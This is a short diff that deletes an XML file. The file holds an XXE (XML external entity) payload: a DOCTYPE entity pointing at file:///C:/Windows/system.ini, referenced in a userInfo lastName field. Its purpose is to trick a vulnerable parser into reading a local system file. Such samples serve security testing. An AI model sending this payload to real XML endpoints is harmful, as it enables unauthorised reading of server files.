@@ -1,6 +1,0 @@
-<!--?xml version="1.0" ?-->
-<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///C:/Windows/system.ini" >]>
- <userInfo>
-  <firstName>John</firstName>
-  <lastName>&xxe;</lastName>
- </userInfo>
